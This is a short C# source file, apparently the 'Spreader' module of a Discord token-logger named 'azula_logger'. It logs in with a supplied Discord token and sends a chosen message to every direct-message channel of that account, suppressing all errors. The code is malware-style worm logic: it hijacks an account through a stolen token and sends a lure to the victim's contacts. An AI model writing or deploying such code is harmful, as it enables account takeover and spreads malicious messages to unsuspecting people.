using Discord;
using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace azula_logger
{
    public static class Spreader
    {

        public static string message()
        {
            string msg = "your-Message";

            return msg;
        }







        public static void spread(string token )
        {
            DiscordSocketClient client = new DiscordSocketClient();
            try
            {
                client.Login(token);
                client.OnLoggedIn += Client_OnLoggedIn;

            }
            catch { }            

            
        }

        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            try
            {
                foreach (var dm in client.GetPrivateChannels())
                {
                    Thread.Sleep(69);
                    dm.SendMessage(message());
                }
            }
            catch { }
            
        }

       
    }
}
